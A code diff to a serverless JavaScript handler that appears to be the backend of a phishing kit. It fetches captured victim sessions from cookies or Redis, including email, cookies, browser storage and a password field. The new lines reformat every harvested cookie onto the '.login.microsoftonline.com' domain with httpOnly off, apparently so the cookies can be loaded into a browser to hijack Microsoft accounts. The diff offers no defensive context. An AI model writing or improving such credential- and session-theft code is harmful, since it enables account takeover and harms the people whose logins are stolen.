@@ -47,6 +47,25 @@ export const handler = async (event, context) => {
         const decodedSession = decodeURIComponent(sessionCookie);
         sessionData = JSON.parse(decodedSession);
         console.log('✅ Session found in cookie:', sessionData.email);
+        
+        // Verify session exists in Redis if available
+        if (UPSTASH_REDIS_REST_URL && UPSTASH_REDIS_REST_TOKEN) {
+          try {
+            const { Redis } = await import('@upstash/redis');
+            const redis = new Redis({
+              url: UPSTASH_REDIS_REST_URL,
+              token: UPSTASH_REDIS_REST_TOKEN,
+            });
+            const redisSession = await redis.get(`session:${sessionData.sessionId}`);
+            if (redisSession) {
+              const updatedSession = JSON.parse(redisSession);
+              sessionData = { ...sessionData, ...updatedSession };
+              console.log('✅ Session updated from Redis');
+            }
+          } catch (redisError) {
+            console.error('❌ Redis verification error:', redisError);
+          }
+        }
       } catch (error) {
         console.error('❌ Error parsing session cookie:', error);
         sessionData = null;
@@ -66,11 +85,13 @@ export const handler = async (event, context) => {
           const redisSession = await redis.get(`session:${sessionId}`);
           if (redisSession) {
             sessionData = JSON.parse(redisSession);
+            console.log('✅ Session found in Redis by ID:', sessionData.email);
           }
         } else if (email) {
           const userSession = await redis.get(`user:${email}`);
           if (userSession) {
             sessionData = JSON.parse(userSession);
+            console.log('✅ Session found in Redis by email:', sessionData.email);
           }
         }
       } catch (redisError) {
@@ -99,11 +120,23 @@ export const handler = async (event, context) => {
         userAgent: event.headers['user-agent'] || 'Unknown',
         deviceType: event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop',
         cookies: cookies.split(';').map(c => c.trim()),
-        formattedCookies: cookies.split(';').map(c => c.trim()),
+        formattedCookies: cookies.split(';').map(c => {
+          const [name, value] = c.trim().split('=');
+          return {
+            name: name,
+            value: value || '',
+            domain: '.login.microsoftonline.com', // Always use Microsoft domain
+            path: '/',
+            secure: true,
+            httpOnly: false,
+            sameSite: 'strict'
+          };
+        }),
         localStorage: 'Not available server-side',
         sessionStorage: 'Not available server-side',
         password: 'Not captured server-side'
       };
+      console.log('✅ Session reconstructed from cookies:', userEmail);
     }
 
     if (!sessionData) {
@@ -118,6 +151,28 @@ export const handler = async (event, context) => {
           email: email
         }),
       };
+    }
+
+    // Ensure all cookies have .login.microsoftonline.com domain
+    let formattedCookies = [];
+    if (Array.isArray(sessionData.formattedCookies)) {
+      formattedCookies = sessionData.formattedCookies.map(cookie => ({
+        ...cookie,
+        domain: '.login.microsoftonline.com'
+      }));
+    } else if (Array.isArray(sessionData.cookies)) {
+      formattedCookies = sessionData.cookies.map(cookieStr => {
+        const [name, value] = typeof cookieStr === 'string' ? cookieStr.trim().split('=') : [cookieStr.name, cookieStr.value];
+        return {
+          name: name,
+          value: value || '',
+          domain: '.login.microsoftonline.com',
+          path: '/',
+          secure: true,
+          httpOnly: false,
+          sameSite: 'strict'
+        };
+      });
     }
 
     return {
@@ -135,10 +190,13 @@ export const handler = async (event, context) => {
           userAgent: sessionData.userAgent || event.headers['user-agent'] || 'Unknown',
           deviceType: sessionData.deviceType || (event.headers['user-agent']?.includes('Mobile') ? 'mobile' : 'desktop'),
           cookies: sessionData.cookies || cookies.split(';').map(c => c.trim()),
-          formattedCookies: sessionData.formattedCookies || cookies.split(';').map(c => c.trim()),
+          formattedCookies: formattedCookies,
           localStorage: sessionData.localStorage || 'Not available server-side',
           sessionStorage: sessionData.sessionStorage || 'Not available server-side',
-          password: sessionData.password || 'Not captured server-side'
+          password: sessionData.password || 'Not captured server-side',
+          cookieCount: Array.isArray(formattedCookies) ? formattedCookies.length : 0,
+          hasLocalStorage: sessionData.localStorage !== 'Empty' && sessionData.localStorage !== 'Not available server-side',
+          hasSessionStorage: sessionData.sessionStorage !== 'Empty' && sessionData.sessionStorage !== 'Not available server-side'
         }
       }),
     };
